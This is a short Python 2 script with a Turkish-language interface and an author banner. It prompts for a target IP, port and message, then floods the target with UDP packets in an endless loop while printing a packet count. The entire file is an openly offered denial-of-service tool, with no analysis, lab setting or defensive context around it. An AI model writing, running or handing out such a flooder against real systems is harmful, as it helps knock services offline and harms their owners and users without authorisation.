import socket
import random
import os

os.system("clear")

banner="""
################################
########---EYUP OZCAN---########
################################
"""
print(banner)
hedef_ip =raw_input('HEDEF IP: ')
port =input('PORT: ')
mesaj = raw_input('MESAJINIZ :')
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
sayac = 0
while True:
    sock.connect((hedef_ip,port))
    sock.sendto(mesaj,(hedef_ip,port))
    sayac += 1
    print "HEDEF : %s HEDEF PORT : %s MESAJINIZ %s PAKET SAYISI : %s"%(hedef_ip,port,mesaj,sayac)